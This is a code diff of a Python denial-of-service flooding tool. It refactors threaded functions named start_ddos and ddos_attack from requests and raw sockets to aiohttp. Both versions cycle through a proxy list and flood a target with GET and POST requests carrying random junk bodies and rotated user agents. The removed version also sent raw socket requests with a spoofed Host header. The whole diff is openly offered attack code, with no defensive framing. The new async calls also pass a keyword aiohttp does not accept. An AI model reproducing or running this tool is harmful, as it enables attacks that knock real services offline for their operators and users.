@@ -15,77 +15,73 @@
 """
 import time
 import random
-import socket
-import struct
-from requests import *
+import asyncio
+import aiohttp
 from threading import Thread
 from fake_useragent import UserAgent
 
+proxies = []
+ua = UserAgent()
+lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"
 
-def start_ddos(threads, time_a, target, ports):
-    for _ in range(threads):
-        th = Thread(target=ddos_attack, args=(time_a, target, ports))
-        th.start()
+with open('input/proxies.txt', 'r') as file:
+	for line in file:
+		proxies.append(line.replace('\n', ''))
 
 
-def ddos_attack(time_a, target, ports):
-    t = time.monotonic()
-    proxies = []
-    ua = UserAgent()
+def start_ddos(threads, time_a, target):
+	for _ in range(threads):
+		th = Thread(target=ddos_attack, args=(time_a, target))
+		th.start()
 
-    with open('input/proxies.txt', 'r') as file:
-        for line in file:
-            proxies.append(line.replace('\n', ''))
 
-    while time.monotonic() - t < time_a:
-        try:
-            user = ua.random
-            port = random.choice(ports)
-            fake_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
-            for proxy in proxies:
-                proxy_2 = {
-                    "http": "http://" + proxy,
-                    "https": "https://" + proxy
-                }
-                lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"
-                st = ''
-                for _ in range(random.randint(10, 200)):
-                    st += random.choice(lib)
-                header = {'user-agent': user}
+async def req(target, proxy):
+	async with aiohttp.ClientSession() as session:
+		user = ua.random
+		st = ''
 
-                try:
-                    get(target, proxies=proxy_2)
-                except:
-                    pass
-                try:
-                    get(target, headers=header, proxies=proxy_2)
-                except:
-                    pass
-                try:
-                    post(target, data=st, headers=header, proxies=proxy_2)
-                except:
-                    pass
-                try:
-                    post(target, data=st, proxies=proxy_2)
-                except:
-                    pass
-                try:
-                    post(target, json=st, headers=header, proxies=proxy_2)
-                except:
-                    pass
-                try:
-                    post(target, json=st, proxies=proxy_2)
-                except:
-                    pass
+		for _ in range(random.randint(10, 200)):
+			st += random.choice(lib)
 
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((target, port))
-                    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-                    s.close()
-                except:
-                    pass
+		header = {'user-agent': user}
 
-        except:
-            pass
+		try:
+			await session.get(target, timeout=1, proxies=proxy)
+		except:
+			pass
+
+		try:
+			await session.get(target, headers=header, timeout=1, proxies=proxy)
+		except:
+			pass
+
+		try:
+			await session.post(target, data=st, headers=header, timeout=1, proxies=proxy)
+		except:
+			pass
+
+		try:
+			await session.post(target, data=st, timeout=1, proxies=proxy)
+		except:
+			pass
+
+		try:
+			await session.post(target, json=st, headers=header, timeout=1, proxies=proxy)
+		except:
+			pass
+
+		try:
+			await session.post(target, json=st, timeout=1, proxies=proxy)
+		except:
+			pass
+
+
+def ddos_attack(time_a, target):
+	t = time.monotonic()
+	while time.monotonic() - t < time_a:
+		for proxy in proxies:
+			proxy_2 = {
+				"http": "http://" + proxy,
+				"https": "https://" + proxy
+			}
+			asyncio.run(req(target, proxy_2))
